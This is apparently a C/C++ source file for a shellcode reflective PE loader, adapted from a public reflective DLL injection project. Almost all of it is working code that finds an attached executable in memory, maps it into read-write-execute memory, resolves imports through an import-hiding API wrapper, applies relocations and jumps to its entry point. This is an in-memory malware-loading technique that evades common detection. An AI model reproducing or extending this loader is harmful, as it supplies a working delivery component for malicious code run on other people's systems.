#pragma code_seg(".text")

#include "ImportlessApi.hpp"
#include <intrin.h>


typedef struct
{
	WORD	offset : 12;
	WORD	type : 4;
} IMAGE_RELOC, * PIMAGE_RELOC;

typedef DWORD(NTAPI* pNtFlushInstructionCache)(HANDLE, PVOID, ULONG);

typedef int(NTAPI* pMain)();


#pragma intrinsic( _ReturnAddress )

__declspec(noinline) ULONG_PTR caller(VOID) { return (ULONG_PTR)_ReturnAddress(); }



/*
	This code will be compiled to a shellcode that its purpose is to find its
	PE file by looping forward the memory and loading it with Reflective DLL injection.

	The code will be very similar to 
		https://github.com/stephenfewer/ReflectiveDLLInjection/blob/master/dll/src/ReflectiveLoader.c
	with some changes.
	

	TODO
		remove step 2 and step 3.
*/
int reflective_injection()
{

	ULONG_PTR dwPeAddress;
	ULONG_PTR dwNtHeaders;
	ULONG_PTR dwBaseAddress;

	ULONG_PTR dwCurrentSection;
	/*
		STEP 0
		Find the PE module attached with the shellcode.

		Changes made to the code from the git library:
			* Instead of going up in the memory we go down.
	*/

	dwPeAddress = (ULONG_PTR)caller();
	while (TRUE)
	{
		if (((PIMAGE_DOS_HEADER)dwPeAddress)->e_magic == IMAGE_DOS_SIGNATURE)
		{
			dwNtHeaders = ((PIMAGE_DOS_HEADER)dwPeAddress)->e_lfanew;

			// some x64 dll's can trigger a bogus signature (IMAGE_DOS_SIGNATURE == 'POP r10'),
			// we sanity check the e_lfanew with an upper threshold value of 1024 to avoid problems.
			if (dwNtHeaders >= sizeof(IMAGE_DOS_HEADER) && dwNtHeaders < 1024)
			{
				dwNtHeaders = dwPeAddress + dwNtHeaders;

				// break if we have found a valid MZ/PE header
				if (((PIMAGE_NT_HEADERS)dwNtHeaders)->Signature == IMAGE_NT_SIGNATURE)
					break;
			}
		}

		// The PE will be down in memory.
		dwPeAddress++;
	}

	/*
		STEP 1 
		Well, there is nothing to do here.

		Changes made to the code from the git library:
			* Instead of finding kernel32.dll exports, we use ImportlessApi.hpp.
	*/


	/*
		STEP 2
		Load the image into a new permanent location in memory

		Changes made to the code from the git library:
			* None.
	*/

	// Allocate Read Write Execute memory for the PE file.
	dwBaseAddress = (ULONG_PTR)IMPORTLESS_API(VirtualAlloc)(NULL, ((PIMAGE_NT_HEADERS)dwNtHeaders)->OptionalHeader.SizeOfImage, MEM_RESERVE | MEM_COMMIT, PAGE_EXECUTE_READWRITE);
	
	// Copy the headers of the PE file to the new location.
	for (size_t i = 0; i < ((PIMAGE_NT_HEADERS)dwNtHeaders)->OptionalHeader.SizeOfHeaders; i++)
	{
		((BYTE*)dwBaseAddress)[i] = ((BYTE*)dwPeAddress)[i];
	}


	/*
		STEP 3
		Load all the sections

		Changes made to the code from the git library:
			* None.
	*/

	// First section address.
	dwCurrentSection = ((ULONG_PTR) & ((PIMAGE_NT_HEADERS)dwNtHeaders)->OptionalHeader + ((PIMAGE_NT_HEADERS)dwNtHeaders)->FileHeader.SizeOfOptionalHeader);

	// Iterate over number of sections and copy each one.
	for (size_t i = 0; i < ((PIMAGE_NT_HEADERS)dwNtHeaders)->FileHeader.NumberOfSections; i++)
	{
		// VirtualAddress of current section.
		ULONG_PTR dwSectionVirtualAddress = ((PIMAGE_SECTION_HEADER)dwCurrentSection)->VirtualAddress;

		// PhysicalAddress of current section.
		ULONG_PTR dwSectionPhysicalAddress = ((PIMAGE_SECTION_HEADER)dwCurrentSection)->PointerToRawData;

		// Copy the section from the dwPeAddress to dwBaseAddress 
		for (size_t j = 0; j < ((PIMAGE_SECTION_HEADER)dwCurrentSection)->SizeOfRawData; j++)
		{
			((BYTE*)(dwBaseAddress + dwSectionVirtualAddress))[j] = ((BYTE*)(dwPeAddress + dwSectionPhysicalAddress))[j];
		}

		// Find next section.
		dwCurrentSection += sizeof(IMAGE_SECTION_HEADER);
	}


	/*
		STEP 4
		Process image import table.

		Changes made to the code from the git library:
			* None.
	*/

	// The address of the import directory.
	ULONG_PTR dwImportDirectory = (ULONG_PTR) & ((PIMAGE_NT_HEADERS)dwNtHeaders)->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_IMPORT];

	// The address of the first entry in the import directory
	ULONG_PTR dwImportDirectoryAddress = (dwBaseAddress + ((PIMAGE_DATA_DIRECTORY)dwImportDirectory)->VirtualAddress);

	// Iterate over all imported modules.
	while (((PIMAGE_IMPORT_DESCRIPTOR)dwImportDirectoryAddress)->Name)
	{
		ULONG_PTR dwLibraryAddress = (ULONG_PTR)IMPORTLESS_API(LoadLibraryA)((LPCSTR)(dwBaseAddress + ((PIMAGE_IMPORT_DESCRIPTOR)dwImportDirectoryAddress)->Name));

		// uiValueD = VA of the OriginalFirstThunk
		ULONG_PTR dwOriginalFirstThunk = (dwBaseAddress + ((PIMAGE_IMPORT_DESCRIPTOR)dwImportDirectoryAddress)->OriginalFirstThunk);

		// uiValueA = VA of the IAT (via first thunk not origionalfirstthunk)
		ULONG_PTR dwFirstThunk = (dwBaseAddress + ((PIMAGE_IMPORT_DESCRIPTOR)dwImportDirectoryAddress)->FirstThunk);

		// Iterate through all imported functions, importing by ordinal if no name present.
		while (*(ULONG_PTR*)dwFirstThunk)
		{
			// Sanity check dwOriginalFirstThunk as some compilers only import by FirstThunk
			if (dwOriginalFirstThunk && ((PIMAGE_THUNK_DATA)dwOriginalFirstThunk)->u1.Ordinal & IMAGE_ORDINAL_FLAG)
			{
				ULONG_PTR dwLibraryNtHeaders = dwLibraryAddress + ((PIMAGE_DOS_HEADER)dwLibraryAddress)->e_lfanew;
				
				ULONG_PTR dwLibraryExportDirectory = (ULONG_PTR) & ((PIMAGE_NT_HEADERS)dwLibraryNtHeaders)->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_EXPORT];

				ULONG_PTR dwLibraryExportDirectoryAddress = (dwLibraryAddress + ((PIMAGE_DATA_DIRECTORY)dwLibraryExportDirectory)->VirtualAddress);

				ULONG_PTR dwLibraryExport_AddressOfFunctions = (dwLibraryAddress + ((PIMAGE_EXPORT_DIRECTORY)dwLibraryExportDirectoryAddress)->AddressOfFunctions);

				// Get the ordinal position in the ordinal array (EXPORT base).
				ULONG_PTR dwLibraryOrdinalPosition = (IMAGE_ORDINAL(((PIMAGE_THUNK_DATA)dwOriginalFirstThunk)->u1.Ordinal)
					- ((PIMAGE_EXPORT_DIRECTORY)dwLibraryExportDirectoryAddress)->Base);

				// Calculate the function address base on the position.
				// Multiply by DWORD because each function address is DWORD size.
				ULONG_PTR dwLibraryOrdinalFunctionRVA = dwLibraryExport_AddressOfFunctions + dwLibraryOrdinalPosition * sizeof(DWORD);

				ULONG_PTR dwLibraryOrdinalFunctionAbsolute = (dwLibraryAddress + (0xFFFFFFFF & dwLibraryOrdinalFunctionRVA));
				
				// Patch in the address for this imported function
				*(ULONG_PTR*)dwFirstThunk = dwLibraryOrdinalFunctionAbsolute;
			}
			else
			{
				// Get the VA of this functions PIMAGE_IMPORT_BY_NAME struct
				ULONG_PTR dwThunkImportByName = (dwBaseAddress + *(ULONG_PTR*)(dwFirstThunk));

				// Use GetProcAddress and patch in the address for this imported function
				*(ULONG_PTR*)dwFirstThunk = (ULONG_PTR)IMPORTLESS_API(GetProcAddress)((HMODULE)dwLibraryAddress, (LPCSTR)((PIMAGE_IMPORT_BY_NAME)dwThunkImportByName)->Name);
			}

			// Get the next imported function
			dwFirstThunk += sizeof(ULONG_PTR);
			if (dwOriginalFirstThunk)
				dwOriginalFirstThunk += sizeof(ULONG_PTR);

		}

		// Get the next import
		dwImportDirectoryAddress += sizeof(IMAGE_IMPORT_DESCRIPTOR);
	}


	/*
		STEP 5
		Process all of our images relocations.

		Changes made to the code from the git library:
			* Removed ARM support. (TODO - Add)
	*/

	// Calculate the base address delta and perform relocations (even if we load at desired image base)
	ULONG_PTR dwDeltaAddresses = dwBaseAddress - ((PIMAGE_NT_HEADERS)dwNtHeaders)->OptionalHeader.ImageBase;

	ULONG_PTR dwRelocationDirectory = (ULONG_PTR) & ((PIMAGE_NT_HEADERS)dwNtHeaders)->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_BASERELOC];

	// Check if there are any relocations present.
	if (((PIMAGE_DATA_DIRECTORY)dwRelocationDirectory)->Size)
	{
		ULONG_PTR dwRelocBlock = (dwBaseAddress + ((PIMAGE_DATA_DIRECTORY)dwRelocationDirectory)->VirtualAddress);


		// Iterate over all relocation entries.
		while (((PIMAGE_BASE_RELOCATION)dwRelocBlock)->SizeOfBlock)
		{
			ULONG_PTR dwRelocationBlock = (dwBaseAddress + ((PIMAGE_BASE_RELOCATION)dwRelocBlock)->VirtualAddress);

			ULONG_PTR dwNumberOfEntries = (((PIMAGE_BASE_RELOCATION)dwRelocBlock)->SizeOfBlock - sizeof(IMAGE_BASE_RELOCATION)) / sizeof(IMAGE_RELOC);

			// uiValueD is now the first entry in the current relocation block
			ULONG_PTR dwCurrentEntry = dwRelocBlock + sizeof(IMAGE_BASE_RELOCATION);

			// Iterate over all entries in the block.
			for (size_t i = 0; i < dwNumberOfEntries; i++)
			{
				if (((PIMAGE_RELOC)dwCurrentEntry)->type == IMAGE_REL_BASED_DIR64)
				{
					*(ULONG_PTR*)(dwRelocationBlock + ((PIMAGE_RELOC)dwCurrentEntry)->offset) += dwDeltaAddresses;
				}
				else if (((PIMAGE_RELOC)dwCurrentEntry)->type == IMAGE_REL_BASED_HIGHLOW)
				{
					*(DWORD*)(dwRelocationBlock + ((PIMAGE_RELOC)dwCurrentEntry)->offset) += (DWORD)dwDeltaAddresses;
				}
				else if (((PIMAGE_RELOC)dwCurrentEntry)->type == IMAGE_REL_BASED_HIGH)
				{
					*(WORD*)(dwRelocationBlock + ((PIMAGE_RELOC)dwCurrentEntry)->offset) += HIWORD(dwDeltaAddresses);
				}
				else if (((PIMAGE_RELOC)dwCurrentEntry)->type == IMAGE_REL_BASED_LOW)
				{
					*(WORD*)(dwRelocationBlock + ((PIMAGE_RELOC)dwCurrentEntry)->offset) += LOWORD(dwDeltaAddresses);
				}

				// Get the next entry in the current relocation block.
				dwCurrentEntry += sizeof(IMAGE_RELOC);

				// Removed ARM Support.
			}

			// Get the next block in the reloc table.
			dwRelocBlock = dwRelocBlock + ((PIMAGE_BASE_RELOCATION)dwRelocBlock)->SizeOfBlock;
		}
	}


	/*
		STEP 6
		Call the main address.

		Changes made to the code from the git library:
			* None.
	*/

	ULONG_PTR dwEntryAddress = (dwBaseAddress + ((PIMAGE_NT_HEADERS)dwNtHeaders)->OptionalHeader.AddressOfEntryPoint);
	


	// We must flush the instruction cache to avoid stale code being used which was updated by our relocation processing.
	IMPORTLESS_API_STR("NtFlushInstructionCache", pNtFlushInstructionCache)((HANDLE)-1, NULL, 0);


	// TODO. Send command line parameters to support argc argv.
	//int argc = 0;
	//LPSTR* pArgvW = CommandLineToArgv(GetCommandLine(), &argc);

	return ((pMain)dwEntryAddress)();
}




int main()
{
	reflective_injection();
}